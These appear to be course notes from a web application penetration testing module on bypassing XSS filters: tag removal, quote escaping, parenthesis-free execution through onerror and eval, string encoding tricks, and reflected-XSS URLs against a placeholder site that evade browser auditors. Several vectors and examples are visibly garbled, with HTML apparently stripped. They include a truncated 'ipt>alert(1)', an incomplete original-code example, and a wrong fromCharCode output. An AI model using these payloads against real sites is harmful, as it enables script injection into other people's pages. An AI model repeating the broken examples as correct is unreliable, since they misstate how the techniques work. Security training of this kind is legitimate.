### WAPTXv2: Section 01, Module 04 - Caendra Inc. © 2020

#### 4.3.1.1 Removing HTML Tags
If we know or can guess the sequence of characters, we can create more complex vectors and use multiple character encodings to bypass filters, as discussed in the "Bypassing Blacklisting Filters" section. The effectiveness of these techniques depends on the specific filter in place.

**Example:**
- Vector: `ipt>alert(1)`

#### 4.3.1.2 Escaping Quotes
HTML tags and injection points often involve quoted strings. Filters typically escape quotes by adding a backslash (`\`) before them. To avoid bypasses, it is also necessary to escape the backslash.

**Example:**
- Original Code: `randomkey`
- Injected Code: `randomkey\' alert(1); //`
- Escaped Input: `randomkey\\' alert(1); //`

**Explanation:**
- The application will escape the apostrophe, transforming the input into `randomkey\\' alert(1); //`.
- This only escapes the backslash, allowing the string to be terminated and the `alert(1)` code to be injected.

**Useful JavaScript Methods:**
- **String.fromCharCode()**: Generates strings from Unicode values.
  - Example: `String.fromCharCode(120, 115, 9416)`
  - Output: `x` (CIRCLED LATIN CAPITAL LETTER S)

**Additional Notes:**
- Spaces are allowed in `.source`:
  - Example: `/your string/.source`
- No spaces allowed with Base36:
  - Example: `43804..toString(36)`

**Escaping Strings:**
- **Using .source technique:**
  - Example: `unescape(/%78%u0073%73/.source)`
  - Note: Although deprecated, many browsers still support this feature.

- **Using decodeURI and decodeURIComponent:**
  - Example: 
    - `decodeURI(/alert(%22xss%22)/.source)`
    - `decodeURIComponent(/alert(%22xss%22)/.source)`
  - These methods are useful for injecting into scripts or event handlers where quotation marks are properly escaped. Remember that these methods return a string, so an execution sink (e.g., `eval`) is needed to trigger the code.

#### 4.3.1.3 Escaping Parentheses
Parentheses are essential for invoking functions and passing parameters. If a filter removes all parentheses, you can use the `onerror` handler to pass arguments without parentheses.

**Technique:**
- **Generate the error:**
  - Example: `window.onerror=eval;throw'=alert\x281\x29'`
  - Explanation: This assigns `eval` to the `onerror` handler and throws an error with the argument `=alert\x281\x29`.

- **Simplified version:**
  - Example: `onerror=alert;throw 1;`
  - Note: This version works in some browsers but not in Firefox and Internet Explorer.

- **Encoded Arguments:**
  - Since the arguments are quoted, encoding can be used to bypass filters.

#### 4.4 Bypassing Browser Filters
Client-side filters aim to protect users from XSS attacks but may not cover all possible attack scenarios, especially for Reflected XSS. Here are some examples of filtered and unfiltered scenarios:

**4.4.1 Injecting Inside HTML Tag**
- Common vector: `http://victim.site/inject?x=<script>alert(1)</script>`
- Bypass for XSSAuditor: Remove the final `>`.

**4.4.2 Injecting Inside HTML Tag Attributes**
- Example: `http://victim.site/inject?x=giuseppe">clickhere`
- Bypass for WebKit: Use the above vector.

**4.4.3 Injecting Inside SCRIPT Tag**
- Example: `http://victim.site/inject?name=giuseppe";alert(1);//`
- JavaScript variables set with URL parameters.

**4.4.4 Injecting Inside Event Attributes**
- Example: `http://victim.site/inject?roomID=alert(1)`
- Event attributes are not inspected by native browser filters.

**4.4.5 DOM Based**
- Example: `http://victim.site/inject?next=javascript:alert(1)`
- DOM-based XSS is not covered by native browser filters.

**Other Scenarios:**
- Fragmented vectors in multiple GET parameters.
- Attacks not reflected on the same page.
- mXSS (Mutation XSS).

### References
- **XSS Filter Evasion Cheat Sheet**: [OWASP](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
- **HTML5 Security Cheatsheet**: [html5sec.org](http://html5sec.org/)
- **OWASP ModSecurity Filter**: [GitHub](https://github.com/SpiderLabs/owasp-modsecurity-crs/blob/master/base_rules/modsecurity_crs_41_xss_attacks.conf)
- **xss.swf**: [GitHub](https://github.com/evilcos/xss.swf)
- **Develop PHP – Development Technology Training Center**: [developphp.com](http://www.developphp.com/)
- **Events in HTML**: [dottoro.com](http://help.dottoro.com/lhwfcplu.php)
- **Control Character**: [Wikipedia](http://en.wikipedia.org/wiki/Control_character)
- **Characters Allowed After Attribute Name**: [shazzer.co.uk](http://shazzer.co.uk/vector/Characters-allowed-after-attribute-name)
- **Characters Allowed Before Attribute Name**: [shazzer.co.uk](http://shazzer.co.uk/vector/Characters-allowed-before-attribute-name)
- **domxsswiki - ExecutionSinks.wiki**: [Google Code](https://code.google.com/p/domxsswiki/wiki/ExecutionSinks)
- **RFC2397**: [IETF](http://tools.ietf.org/html/rfc2397)
- **VBScript is no longer supported in IE11 edge mode**: [MSDN](http://msdn.microsoft.com/en-us/library/ie/dn384057(v=vs.85).aspx)
- **Using Script Encoder**: [MSDN](http://msdn.microsoft.com/en-us/library/cbfz3598(v=vs.84).aspx)
- **Script Encoder Plus**: [Dennis Babkin](http://dennisbabkin.com/screnc/)
- **XSS technique without parentheses**: [thespanner.co.uk](http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/)
- **Unofficial URI scheme**: [IETF](http://tools.ietf.org/html/draft-hoehrmann-javascript-scheme-03)